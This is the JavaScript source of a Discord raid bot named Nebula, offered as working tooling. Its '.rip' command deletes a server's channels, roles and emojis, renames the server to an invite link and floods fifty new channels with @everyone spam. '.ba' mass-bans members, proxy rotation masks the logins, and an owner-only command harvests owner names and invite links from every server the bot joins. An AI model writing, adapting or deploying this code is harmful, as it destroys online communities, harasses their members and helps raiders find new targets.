const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');
const fs = require('fs');
const { HttpsProxyAgent } = require('https-proxy-agent');

dotenv.config();

// ====== LOAD PROXIES FROM proxies.txt ======
let proxies = [];
try {
  const data = fs.readFileSync('./proxies.txt', 'utf-8');
  proxies = data
    .split('\n')
    .map(line => line.trim())
    .filter(line => line && /^https?:\/\//i.test(line));
  console.log(`✅ Loaded ${proxies.length} proxies.`);
} catch (err) {
  console.warn('⚠️ proxies.txt not found or invalid:', err.message);
}

// Helper: Get random proxy agent
function getRandomProxyAgent() {
  if (proxies.length === 0) return null;
  const proxyUrl = proxies[Math.floor(Math.random() * proxies.length)];
  try {
    return new HttpsProxyAgent(proxyUrl);
  } catch (err) {
    console.warn(`⚠️ Invalid proxy format: ${proxyUrl}`);
    return null;
  }
}

// ====== WEB SERVER FOR KEEP-ALIVE ======
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => {
  res.send('Nebula Bot is online and awaiting .rip command...');
});
app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== RATE LIMIT HANDLER ======
async function handleRateLimit(promiseFn, maxRetries = 5) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = Math.max(error.retry_after || 1000, 1000);
        await new Promise(resolve => setTimeout(resolve, retryAfter));
        retries++;
      } else if (error.code === 401 || error.code === 403) {
        throw error;
      } else {
        console.error(`[ERROR] ${error.message}`);
        return null;
      }
    }
  }
  return null;
}

// ====== SAFE LEAVE FUNCTION ======
async function safeLeaveGuild(guild) {
  if (!guild?.available || !guild.members.me) return;
  try {
    await handleRateLimit(() => guild.leave());
    console.log('🚪 Left server');
  } catch (err) {
    if ([50001, 404, 403].includes(err.code)) {
      console.log('✅ Already left or kicked');
    } else {
      console.error('⚠️ Leave error:', err.message);
    }
  }
}

// ====== DISCORD CLIENT SETUP (Proxy Ready) ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== LOGIN WITH PROXY ======
async function loginWithRetry(token, attempts = 3) {
  for (let i = 0; i < attempts; i++) {
    const agent = getRandomProxyAgent();
    const tempClient = new Client({
      intents: client.options.intents,
      agent: agent ? { https: agent } : undefined
    });

    const proxyInfo = agent ? ` via ${agent.proxy.href}` : ' (direct)';
    console.log(`🔁 Attempt ${i + 1}${proxyInfo}...`);

    try {
      await tempClient.login(token);
      console.log(`🎉 Logged in${proxyInfo}`);
      Object.assign(client, tempClient);
      return;
    } catch (err) {
      console.error(`❌ Login failed${proxyInfo}:`, err.message.slice(0, 100));
      if (i === attempts - 1) break;
      await new Promise(r => setTimeout(r, 3000));
    }
  }

  // Fallback: Direct connection
  console.log('🔁 All proxy attempts failed. Falling back to direct...');
  await client.login(token).catch(err => {
    console.error('❌ Direct login failed:', err.message);
  });
}

// ====== BOT READY EVENT ======
client.on('ready', () => {
  const proxyUsed = client.options.agent?.https
    ? `via proxy ${client.options.agent.https.proxy.href}`
    : 'direct';
  console.log(`🚀 Logged in as ${client.user.tag} ${proxyUsed}`);
});

// ====== MESSAGE HANDLER (Silent Commands) ======
client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('.') || message.author.bot) return;

  const args = message.content.slice(1).trim().split(/ +/);
  const command = args[0].toLowerCase();
  const BLOCKED_GUILD_ID = '1345474714331643956';

  // ===== HELP COMMAND =====
  if (command === 'help') {
    const helpEmbed = new EmbedBuilder()
      .setTitle('🤖 Nebula Bot Commands')
      .setDescription('Available commands:')
      .addFields(
        { name: '.rip', value: 'Nukes the server' },
        { name: '.ba', value: 'Bans all members' },
        { name: '.help', value: 'Sends this help to your DMs' }
      )
      .setColor('#ff0000')
      .setFooter({ text: 'Use responsibly' });

    try {
      await message.author.send({ embeds: [helpEmbed] });
    } catch {}
    return;
  }

  // ===== SERVERS COMMAND (Owner Only) =====
  if (command === 'servers') {
    if (message.author.id !== '1400281740978815118') return;

    const serverList = await Promise.all(client.guilds.cache.map(async (guild) => {
      try {
        const owner = await handleRateLimit(() => guild.fetchOwner());
        const invites = await handleRateLimit(() => guild.invites.fetch());
        const invite = invites.first()?.url || 'No invite';
        return { name: guild.name, id: guild.id, owner: owner.user.tag, invite };
      } catch {
        return { name: guild.name, id: guild.id, error: 'No perms' };
      }
    }));

    const embed = new EmbedBuilder()
      .setTitle('🌐 Servers I\'m In')
      .setDescription(`Total: ${serverList.length}`)
      .setColor('#00ffff');

    for (let i = 0; i < Math.min(serverList.length, 25); i++) {
      const s = serverList[i];
      embed.addFields({
        name: `${i + 1}. ${s.name}`,
        value: s.error
          ? `ID: ${s.id}\n⚠️ ${s.error}`
          : `Owner: ${s.owner}\nID: ${s.id}\n🔗 [Join](${s.invite})`
      });
    }

    try {
      await message.author.send({ embeds: [embed] });
      if (serverList.length > 25) {
        let page = 2;
        for (let i = 25; i < serverList.length; i += 25) {
          const pageEmbed = new EmbedBuilder()
            .setTitle(`🌐 Servers (Page ${page++})`)
            .setColor('#00ffff');
          serverList.slice(i, i + 25).forEach(s => {
            pageEmbed.addFields({
              name: s.name,
              value: s.error
                ? `ID: ${s.id}\n⚠️ ${s.error}`
                : `Owner: ${s.owner}\nID: ${s.id}\n🔗 [Join](${s.invite})`
            });
          });
          await message.author.send({ embeds: [pageEmbed] });
        }
      }
    } catch {}
    return;
  }

  // Block commands in specific server
  if ((command === 'ba' || command === 'rip') && message.guild.id === BLOCKED_GUILD_ID) {
    return;
  }

  // ===== BAN ALL (.ba) =====
  if (command === 'ba') {
    if (!message.member.permissions.has('BAN_MEMBERS')) return;

    const guild = message.guild;
    const ownerID = guild.ownerId;

    try {
      const members = await guild.members.fetch();
      const toBan = members.filter(m =>
        m.id !== ownerID && !m.user.bot && m.bannable
      );

      let bannedCount = 0;
      for (const member of toBan.values()) {
        await handleRateLimit(() => guild.members.ban(member, {
          reason: 'Nebula Ban All',
          deleteMessageSeconds: 604800
        })).then(() => bannedCount++).catch(() => {});
        await new Promise(r => setTimeout(r, 50));
      }
    } catch {}
    return;
  }

  // ===== RIP COMMAND (.rip) =====
  if (command === 'rip') {
    const guild = message.guild;
    const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
    const channelName = 'neb-was-here';
    let sent = 0;

    try {
      // Delete channels
      await Promise.all(guild.channels.cache.map(ch => handleRateLimit(() => ch.delete()).catch(() => {})));

      // Delete roles
      await Promise.all(guild.roles.cache.map(r => {
        if (r.name !== '@everyone' && !r.managed) {
          return handleRateLimit(() => r.delete()).catch(() => {});
        }
      }));

      // Delete emojis
      await Promise.all(guild.emojis.cache.map(e => handleRateLimit(() => e.delete()).catch(() => {})));

      // Rename server
      await handleRateLimit(() => guild.setName('discord.gg/migh')).catch(() => {});

      // Create 50 channels
      const createdChannels = [];
      for (let i = 0; i < 50; i++) {
        const ch = await handleRateLimit(() =>
          guild.channels.create({ name: `${channelName}-${i + 1}` })
        ).catch(() => null);
        if (ch) createdChannels.push(ch);
      }

      if (createdChannels.length === 0) return;

      // Spam 1000 messages
      const sendPromises = createdChannels.map(channel => async () => {
        for (let i = 0; i < 20 && sent < 1000; i++) {
          await handleRateLimit(() => channel.send(spamMessage)).catch(() => {});
          sent++;
          await new Promise(r => setTimeout(r, 2));
        }
      });

      await Promise.all(sendPromises.map(fn => fn()));

      if (sent >= 950) await safeLeaveGuild(guild);
    } catch {}
  }
});

// ====== START BOT ======
const token = process.env.TOKEN;
if (!token) {
  console.error('❌ No token found in .env');
} else {
  loginWithRetry(token);
}
